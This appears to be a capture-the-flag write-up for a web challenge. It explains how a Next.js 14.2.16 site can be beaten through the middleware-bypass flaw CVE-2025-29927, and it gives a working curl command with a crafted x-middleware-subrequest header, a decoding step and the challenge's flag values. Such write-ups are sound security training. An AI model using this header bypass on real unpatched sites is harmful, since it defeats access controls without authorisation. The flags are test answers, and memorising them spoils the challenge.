# Chamber of Secrets

**Category:** web  **Author:** PsychoSherlock

> You're a muggle-born who just got access to the dev environment of a the Hogwards School website. It was made using a new **magic AI of version 0** by a magical consortium. While exploring you identify that the magic this consortium used had some security flaws recently. The lazy developer never patched it either. Can you identify the issue to trick the wizards and unlock the chamber of secrets?

Run: `docker build -t hogwarts . && docker run -p 8080:8080 hogwarts`

## Solution

"Magic AI of version 0" is v0, so this is a v0-generated Next.js site. `package.json` pins `next` 14.2.16. Everything under `/forbidden/` redirects you back to `/forbidden`, and that redirect lives in `middleware.ts`.

Next.js before 14.2.25 trusts the internal `x-middleware-subrequest` header (CVE-2025-29927). If the header lists the middleware name enough times to hit the recursion limit, Next skips the middleware entirely. On 14.x that's 5 repeats:

```
curl -s http://localhost:8080/forbidden/chamber-of-secrets \
  -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
```

The chamber page renders `process.env.FLAG`, which the entrypoint sets to the flag base64-encoded twice:

```
echo '<blob>' | base64 -d | base64 -d
```

Flag is per-instance: `H7CTF{al0ha_m1ddl3ware_m1ddl3ware_m1ddl3ware_<uuid>}` (the original static one was `H7CTF{al0ha_m1ddl3ware_m1ddl3ware_m1ddl3ware}`)
